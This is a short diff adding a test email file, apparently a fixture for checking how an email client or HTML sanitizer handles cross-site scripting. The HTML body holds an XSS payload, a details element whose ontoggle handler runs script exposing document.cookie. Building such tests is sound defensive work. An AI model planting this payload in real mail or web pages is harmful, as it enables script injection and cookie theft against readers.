@@ -1,0 +1,10 @@
+From: "Renaud Lancelot" <renaud.lancelot@gmail.com>
+To: jennifer.cutaia@enron.com, suhernan@llgm.com, dora_thurmond@uniteddc.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<details ontoggle="confirm(document.cookie)">
+   xss
+   <summary>click me</summary>xssxssxss
+  </details>
